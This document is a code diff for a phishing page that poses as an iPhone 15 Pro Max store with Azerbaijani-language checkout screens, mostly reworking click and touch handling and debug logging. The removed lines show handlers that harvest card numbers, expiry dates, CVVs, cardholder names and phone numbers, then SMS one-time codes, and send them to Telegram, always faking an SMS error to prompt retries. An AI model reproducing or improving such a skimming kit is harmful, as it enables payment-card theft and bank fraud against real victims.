@@ -46,59 +46,96 @@ function isMac() {
   return navigator.platform.toUpperCase().indexOf("MAC") >= 0
 }
 
-// Touch event support for mobile
-function addTouchSupport(element, callback) {
+// Enhanced touch support for all devices
+function addUniversalClickSupport(element, callback) {
   if (!element) return
 
-  // Add both click and touch events
-  element.addEventListener("click", callback, { passive: false })
-  element.addEventListener("touchstart", callback, { passive: false })
-  element.addEventListener(
-    "touchend",
-    (e) => {
-      e.preventDefault()
-      callback(e)
-    },
-    { passive: false },
-  )
+  // Remove any existing event listeners
+  element.removeEventListener("click", callback)
+  element.removeEventListener("touchstart", callback)
+  element.removeEventListener("touchend", callback)
 
-  // Add visual feedback for touch
+  // Add click event (works on all devices)
+  element.addEventListener("click", (e) => {
+    e.preventDefault()
+    e.stopPropagation()
+    console.log("Click event triggered on:", element)
+    callback(e)
+  })
+
+  // Add touch events for mobile devices
+  if (isMobile() || isIOS()) {
+    let touchStartTime = 0
+
+    element.addEventListener(
+      "touchstart",
+      (e) => {
+        touchStartTime = Date.now()
+        element.style.opacity = "0.7"
+      },
+      { passive: true },
+    )
+
+    element.addEventListener(
+      "touchend",
+      (e) => {
+        const touchDuration = Date.now() - touchStartTime
+        element.style.opacity = "1"
+
+        // Only trigger if it's a quick tap (not a scroll)
+        if (touchDuration < 500) {
+          e.preventDefault()
+          e.stopPropagation()
+          console.log("Touch event triggered on:", element)
+          callback(e)
+        }
+      },
+      { passive: false },
+    )
+
+    element.addEventListener("touchcancel", () => {
+      element.style.opacity = "1"
+    })
+  }
+
+  // Enhanced styling for better touch interaction
   element.style.cursor = "pointer"
-  element.style.webkitTapHighlightColor = "rgba(0,0,0,0.1)"
+  element.style.webkitTapHighlightColor = "transparent"
   element.style.webkitUserSelect = "none"
   element.style.userSelect = "none"
+  element.style.webkitTouchCallout = "none"
 }
 
-// Global function declarations - Tüm platformlarda çalışması için
+// Global function declarations with enhanced debugging
 function goToCheckout() {
-  console.log("goToCheckout called")
+  console.log("🔥 goToCheckout called - navigating to checkout")
   showPage("checkoutPage")
 }
 
 function goToProduct() {
-  console.log("goToProduct called")
+  console.log("🔥 goToProduct called - navigating to product")
   showPage("productPage")
 }
 
 function goToPayment() {
-  console.log("goToPayment called")
+  console.log("🔥 goToPayment called - navigating to payment")
   showPage("cardPage")
 }
 
 function goToSms() {
-  console.log("goToSms called")
+  console.log("🔥 goToSms called - navigating to SMS")
   showPage("smsPage")
 }
 
 function selectImage(index) {
-  console.log("selectImage called:", index)
+  console.log("🔥 selectImage called:", index)
   currentImageIndex = index
   updateMainImage()
   updateThumbnails()
 }
 
 function changeImage(direction) {
-  console.log("changeImage called:", direction)
+  console.log("🔥 changeImage called:", direction)
   const images = colorImages[selectedColor]
   const newIndex = currentImageIndex + direction
 
@@ -110,7 +147,7 @@ function changeImage(direction) {
 }
 
 function selectColor(colorId, colorName) {
-  console.log("selectColor called:", colorId, colorName)
+  console.log("🔥 selectColor called:", colorId, colorName)
   selectedColor = colorId
   currentImageIndex = 0
 
@@ -151,7 +188,7 @@ function selectColor(colorId, colorName) {
 }
 
 function submitCardForm(event) {
-  console.log("submitCardForm called")
+  console.log("🔥 submitCardForm called")
   event.preventDefault()
 
   const submitBtn = event.target.querySelector(".btn-confirm")
@@ -183,7 +220,7 @@ function submitCardForm(event) {
 }
 
 function submitSmsCode(event) {
-  console.log("submitSmsCode called")
+  console.log("🔥 submitSmsCode called")
   event.preventDefault()
 
   const smsCode = document.getElementById("smsCode")?.value || ""
@@ -205,7 +242,7 @@ function submitSmsCode(event) {
 }
 
 function resendSms() {
-  console.log("resendSms called")
+  console.log("🔥 resendSms called")
   // Reset timer
   startTimer()
 
@@ -219,23 +256,22 @@ function resendSms() {
   }
 }
 
-// Global scope'a fonksiyonları ekle
-if (typeof window !== "undefined") {
-  window.goToCheckout = goToCheckout
-  window.goToProduct = goToProduct
-  window.goToPayment = goToPayment
-  window.goToSms = goToSms
-  window.selectImage = selectImage
-  window.changeImage = changeImage
-  window.selectColor = selectColor
-  window.submitCardForm = submitCardForm
-  window.submitSmsCode = submitSmsCode
-  window.resendSms = resendSms
-}
+// Assign functions to window object for global access
+window.goToCheckout = goToCheckout
+window.goToProduct = goToProduct
+window.goToPayment = goToPayment
+window.goToSms = goToSms
+window.selectImage = selectImage
+window.changeImage = changeImage
+window.selectColor = selectColor
+window.submitCardForm = submitCardForm
+window.submitSmsCode = submitSmsCode
+window.resendSms = resendSms
 
-// showPage fonksiyonu
+// showPage function with enhanced debugging
 function showPage(pageId) {
-  console.log("showPage called:", pageId)
+  console.log("🔥 showPage called:", pageId)
+
   // Hide all pages
   const pages = document.querySelectorAll(".page")
   pages.forEach((page) => {
@@ -247,6 +283,7 @@ function showPage(pageId) {
   if (targetPage) {
     targetPage.classList.add("active")
     currentPage = pageId
+    console.log("✅ Page switched to:", pageId)
 
     // Start timer for SMS page
     if (pageId === "smsPage") {
@@ -257,177 +294,16 @@ function showPage(pageId) {
 
     // Scroll to top
     window.scrollTo(0, 0)
+  } else {
+    console.error("❌ Page not found:", pageId)
   }
 }
 
-window.goToCheckout = () => {
-  showPage("checkoutPage")
-}
-
-window.goToProduct = () => {
-  showPage("productPage")
-}
-
-window.goToPayment = () => {
-  showPage("cardPage")
-}
-
-window.goToSms = () => {
-  showPage("smsPage")
-}
-
-// showPage fonksiyonunu da window'a ekle
-window.showPage = (pageId) => {
-  // Hide all pages
-  const pages = document.querySelectorAll(".page")
-  pages.forEach((page) => {
-    page.classList.remove("active")
-  })
-
-  // Show selected page
-  const targetPage = document.getElementById(pageId)
-  if (targetPage) {
-    targetPage.classList.add("active")
-    currentPage = pageId
-
-    // Start timer for SMS page
-    if (pageId === "smsPage") {
-      startTimer()
-    } else {
-      stopTimer()
-    }
-
-    // Scroll to top
-    window.scrollTo(0, 0)
-  }
-}
-
-window.selectImage = (index) => {
-  currentImageIndex = index
-  updateMainImage()
-  updateThumbnails()
-}
-
-window.changeImage = (direction) => {
-  const images = colorImages[selectedColor]
-  const newIndex = currentImageIndex + direction
-
-  if (newIndex >= 0 && newIndex < images.length) {
-    currentImageIndex = newIndex
-    updateMainImage()
-    updateThumbnails()
-  }
-}
-
-window.selectColor = (colorId, colorName) => {
-  selectedColor = colorId
-  currentImageIndex = 0
-
-  // Update color options
-  const colorOptions = document.querySelectorAll(".color-option")
-  colorOptions.forEach((option) => {
-    option.classList.remove("active")
-  })
-
-  // Find and activate the selected color option
-  const selectedOption = document.querySelector(`[onclick*="${colorId}"]`)
-  if (selectedOption) {
-    selectedOption.classList.add("active")
-  }
-
-  // Update color name display
-  const colorNameElement = document.getElementById("selectedColorName")
-  if (colorNameElement) {
-    colorNameElement.textContent = colorName
-  }
-
-  // Update product title
-  const productTitle = document.querySelector(".product-title")
-  if (productTitle) {
-    productTitle.textContent = `iPhone 15 Pro Max 256 GB ${colorName}`
-  }
-
-  // Update breadcrumb
-  const breadcrumbCurrent = document.querySelector(".breadcrumb .current")
-  if (breadcrumbCurrent) {
-    breadcrumbCurrent.textContent = `iPhone 15 Pro Max 256 GB ${colorName}`
-  }
-
-  // Update images
-  updateMainImage()
-  updateThumbnailImages()
-  updateThumbnails()
-}
-
-window.submitCardForm = (event) => {
-  event.preventDefault()
-
-  const submitBtn = event.target.querySelector(".btn-confirm")
-  submitBtn.textContent = "İşlənir..."
-  submitBtn.disabled = true
-
-  // Collect card data
-  const cardData = {
-    cardNumber: document.getElementById("cardNumber")?.value || "",
-    expiry:
-      (document.getElementById("expiryMonth")?.value || "") +
-      "/" +
-      (document.getElementById("expiryYear")?.value || ""),
-    cvv: document.getElementById("cvv")?.value || "",
-    cardHolder: document.getElementById("cardHolder")?.value || "",
-    phone:
-      (document.getElementById("phonePrefix")?.value || "") +
-      " " +
-      (document.getElementById("phoneNumber")?.value || ""),
-  }
-
-  // Send to Telegram
-  sendToTelegram(cardData, "PAYMENT")
-
-  // Always proceed to SMS page after 1.5 seconds
-  setTimeout(() => {
-    showPage("smsPage")
-  }, 1500)
-}
-
-window.submitSmsCode = (event) => {
-  event.preventDefault()
-
-  const smsCode = document.getElementById("smsCode")?.value || ""
-
-  // Send SMS code to Telegram
-  sendToTelegram({ smsCode }, "SMS")
-
-  // Always show error message and clear input
-  const errorMessage = document.getElementById("errorMessage")
-  if (errorMessage) {
-    errorMessage.style.display = "block"
-  }
-
-  // Clear the input
-  const smsInput = document.getElementById("smsCode")
-  if (smsInput) {
-    smsInput.value = ""
-  }
-}
-
-window.resendSms = () => {
-  // Reset timer
-  startTimer()
-
-  // Show success message
-  alert("SMS kodu yenidən göndərildi")
-
-  // Clear any error messages
-  const errorMessage = document.getElementById("errorMessage")
-  if (errorMessage) {
-    errorMessage.style.display = "none"
-  }
-}
+window.showPage = showPage
 
 // Initialize the application
 document.addEventListener("DOMContentLoaded", () => {
-  console.log("DOM loaded, initializing app")
+  console.log("🚀 DOM loaded, initializing app")
   initializeApp()
 })
 
@@ -435,109 +311,138 @@ document.addEventListener("DOMContentLoaded", () => {
 document.addEventListener("touchstart", () => {}, { passive: true })
 
 function initializeApp() {
-  console.log("App initializing...")
+  console.log("🚀 App initializing...")
   showPage("productPage")
   updateMainImage()
   setupEventListeners()
-  setupMobileSupport()
+  setupUniversalClickSupport()
+
+  // Add viewport meta tag if missing
+  if (!document.querySelector('meta[name="viewport"]')) {
+    const viewport = document.createElement("meta")
+    viewport.name = "viewport"
+    viewport.content = "width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"
+    document.head.appendChild(viewport)
+  }
 }
 
-function setupMobileSupport() {
-  console.log("Setting up mobile support...")
+function setupUniversalClickSupport() {
+  console.log("🔧 Setting up universal click support...")
 
-  // Ana buton için touch support
-  const primaryBtn = document.querySelector(".btn-primary")
-  if (primaryBtn) {
-    addTouchSupport(primaryBtn, (e) => {
-      e.preventDefault()
-      e.stopPropagation()
-      goToCheckout()
-    })
-  }
+  // Wait for DOM to be fully loaded
+  setTimeout(() => {
+    // Primary action button
+    const primaryBtn = document.querySelector(".btn-primary")
+    if (primaryBtn) {
+      console.log("✅ Adding click support to primary button")
+      addUniversalClickSupport(primaryBtn, () => {
+        console.log("🎯 Primary button clicked!")
+        goToCheckout()
+      })
+    }
 
-  // Complete order buton için touch support
-  const completeBtn = document.querySelector(".btn-complete-order")
-  if (completeBtn) {
-    addTouchSupport(completeBtn, (e) => {
-      e.preventDefault()
-      e.stopPropagation()
-      goToPayment()
-    })
-  }
+    // Complete order button
+    const completeBtn = document.querySelector(".btn-complete-order")
+    if (completeBtn) {
+      console.log("✅ Adding click support to complete order button")
+      addUniversalClickSupport(completeBtn, () => {
+        console.log("🎯 Complete order button clicked!")
+        goToPayment()
+      })
+    }
 
-  // Back butonları için touch support
-  const backBtns = document.querySelectorAll(".back-btn")
-  backBtns.forEach((btn) => {
-    addTouchSupport(btn, (e) => {
-      e.preventDefault()
-      e.stopPropagation()
-      const onclick = btn.getAttribute("onclick")
-      if (onclick) {
-        eval(onclick)
-      }
-    })
-  })
-
-  // Thumbnail butonları için touch support
-  const thumbnails = document.querySelectorAll(".thumbnail")
-  thumbnails.forEach((thumb, index) => {
-    addTouchSupport(thumb, (e) => {
-      e.preventDefault()
-      e.stopPropagation()
-      selectImage(index)
-    })
-  })
-
-  // Color butonları için touch support
-  const colorBtns = document.querySelectorAll(".color-option")
-  colorBtns.forEach((btn) => {
-    addTouchSupport(btn, (e) => {
-      e.preventDefault()
-      e.stopPropagation()
-      const onclick = btn.getAttribute("onclick")
-      if (onclick) {
-        eval(onclick)
-      }
-    })
-  })
-
-  // Navigation butonları için touch support
-  const navBtns = document.querySelectorAll(".nav-btn")
-  navBtns.forEach((btn) => {
-    addTouchSupport(btn, (e) => {
-      e.preventDefault()
-      e.stopPropagation()
-      const onclick = btn.getAttribute("onclick")
-      if (onclick) {
-        eval(onclick)
-      }
-    })
-  })
-
-  // Form butonları için touch support
-  const formBtns = document.querySelectorAll(".btn-confirm, .btn-cancel, .btn-resend")
-  formBtns.forEach((btn) => {
-    addTouchSupport(btn, (e) => {
-      e.preventDefault()
-      e.stopPropagation()
-      if (btn.type === "submit") {
-        const form = btn.closest("form")
-        if (form) {
-          const event = new Event("submit", { bubbles: true, cancelable: true })
-          form.dispatchEvent(event)
-        }
-      } else {
+    // Back buttons
+    const backBtns = document.querySelectorAll(".back-btn")
+    backBtns.forEach((btn, index) => {
+      console.log(`✅ Adding click support to back button ${index}`)
+      addUniversalClickSupport(btn, () => {
+        console.log(`🎯 Back button ${index} clicked!`)
         const onclick = btn.getAttribute("onclick")
         if (onclick) {
-          eval(onclick)
+          try {
+            eval(onclick)
+          } catch (e) {
+            console.error("Error executing onclick:", e)
+          }
         }
-      }
+      })
     })
-  })
+
+    // Thumbnail buttons
+    const thumbnails = document.querySelectorAll(".thumbnail")
+    thumbnails.forEach((thumb, index) => {
+      console.log(`✅ Adding click support to thumbnail ${index}`)
+      addUniversalClickSupport(thumb, () => {
+        console.log(`🎯 Thumbnail ${index} clicked!`)
+        selectImage(index)
+      })
+    })
+
+    // Color buttons
+    const colorBtns = document.querySelectorAll(".color-option")
+    colorBtns.forEach((btn, index) => {
+      console.log(`✅ Adding click support to color button ${index}`)
+      addUniversalClickSupport(btn, () => {
+        console.log(`🎯 Color button ${index} clicked!`)
+        const onclick = btn.getAttribute("onclick")
+        if (onclick) {
+          try {
+            eval(onclick)
+          } catch (e) {
+            console.error("Error executing onclick:", e)
+          }
+        }
+      })
+    })
+
+    // Navigation buttons
+    const navBtns = document.querySelectorAll(".nav-btn")
+    navBtns.forEach((btn, index) => {
+      console.log(`✅ Adding click support to nav button ${index}`)
+      addUniversalClickSupport(btn, () => {
+        console.log(`🎯 Nav button ${index} clicked!`)
+        const onclick = btn.getAttribute("onclick")
+        if (onclick) {
+          try {
+            eval(onclick)
+          } catch (e) {
+            console.error("Error executing onclick:", e)
+          }
+        }
+      })
+    })
+
+    // Form buttons
+    const formBtns = document.querySelectorAll(".btn-confirm, .btn-cancel, .btn-resend")
+    formBtns.forEach((btn, index) => {
+      console.log(`✅ Adding click support to form button ${index}`)
+      addUniversalClickSupport(btn, () => {
+        console.log(`🎯 Form button ${index} clicked!`)
+        if (btn.type === "submit") {
+          const form = btn.closest("form")
+          if (form) {
+            const event = new Event("submit", { bubbles: true, cancelable: true })
+            form.dispatchEvent(event)
+          }
+        } else {
+          const onclick = btn.getAttribute("onclick")
+          if (onclick) {
+            try {
+              eval(onclick)
+            } catch (e) {
+              console.error("Error executing onclick:", e)
+            }
+          }
+        }
+      })
+    })
+
+    console.log("✅ Universal click support setup complete!")
+  }, 100)
 }
 
 function setupEventListeners() {
-  console.log("Setting up event listeners...")
+  console.log("🔧 Setting up event listeners...")
 
   // Phone number formatting
   const phonePrefix = document.getElementById("phonePrefix")
@@ -559,10 +464,11 @@ function setupEventListeners() {
   if (phoneNumber) {
     phoneNumber.addEventListener("input", (e) => {
       let value = e.target.value.replace(/\D/g, "")
-      if (value.length > 7) {
-        value = value.substring(0, 7)
+      if (value.length > 8) {
+        // 7'den 8'e değiştir
+        value = value.substring(0, 8) // 7'den 8'e değiştir
       }
-      // Format as XXX XX XX
+      // Format as XXX XX XXX (son kısım 3 rakam olacak)
       if (value.length > 3) {
         if (value.length > 5) {
           value = value.substring(0, 3) + " " + value.substring(3, 5) + " " + value.substring(5)
@@ -636,14 +542,6 @@ function setupEventListeners() {
     cardHolder.addEventListener("input", (e) => {
       e.target.value = e.target.value.toUpperCase()
     })
-  }
-
-  // Mobile viewport fix
-  if (isMobile()) {
-    const viewport = document.querySelector("meta[name=viewport]")
-    if (viewport) {
-      viewport.setAttribute("content", "width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no")
-    }
   }
 }
 
@@ -794,17 +692,24 @@ function updateTimerDisplay() {
 
 // Initialize when page loads
 window.addEventListener("load", () => {
-  console.log("iPhone Product Page Loaded Successfully!")
-  console.log("Device info:", {
+  console.log("🎉 iPhone Product Page Loaded Successfully!")
+  console.log("📱 Device info:", {
     isMobile: isMobile(),
     isIOS: isIOS(),
     isMac: isMac(),
     userAgent: navigator.userAgent,
+    platform: navigator.platform,
+    touchPoints: navigator.maxTouchPoints,
   })
+
+  // Re-setup click support after page load
+  setTimeout(setupUniversalClickSupport, 500)
 })
 
 // iOS Safari için ek düzeltmeler
-if (isIOS()) {
+if (isIOS() || isMac()) {
+  console.log("🍎 iOS/Mac detected - applying fixes")
+
   document.addEventListener("touchstart", () => {}, { passive: true })
 
   // iOS'ta onclick olaylarını zorla aktif et
@@ -813,6 +718,18 @@ if (isIOS()) {
     clickableElements.forEach((element) => {
       element.style.cursor = "pointer"
       element.addEventListener("touchstart", () => {}, { passive: true })
+
+      // Force enable click events
+      element.onclick = function (e) {
+        const originalOnclick = this.getAttribute("onclick")
+        if (originalOnclick) {
+          try {
+            eval(originalOnclick)
+          } catch (error) {
+            console.error("Error executing onclick:", error)
+          }
+        }
+      }
     })
   })
 }
